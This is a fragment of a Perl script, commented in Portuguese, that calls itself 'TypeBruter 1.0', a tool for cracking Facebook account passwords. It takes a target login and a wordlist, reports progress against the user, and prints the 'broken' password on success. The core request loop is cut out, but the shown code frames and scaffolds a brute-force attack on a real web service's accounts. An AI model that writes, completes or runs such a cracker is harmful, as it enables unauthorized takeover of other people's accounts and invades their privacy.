...
#
# Descrição:
# Script para quebra de senhas de Facebook em perl.
#
# Como usar:
# perl typebruter.pl <login> <wordlist>
#
...
system('clear');
print "\n!!!!! TypeBruter 1.0 !!!!!\n";
print "\n[+] Desenvolvido por Dual.\n";
print "\n[+] Use: perl $0 <login> <wordlist>\n\n";
exit; }

my $user = $ARGV[0];
my $wordlist = $ARGV[1];

open (LIST, $wordlist) || die "\n[-] Não foi encontrada uma wordlist.\n";

print "\n!!!!! TypeBruter 1.0 !!!!!\n";
print "\n[+] Desenvolvido por Dual";
print "\n[+] Quebrando senha de $user...\n\n";
...
{
print "\n++++++++++++++++++++++++++++++++++++++++++++++++++++++\n";
print "[+] Opa! Senha quebrada. A senha é ($password).";
print "\n++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n";
close SSL;
exit;
}
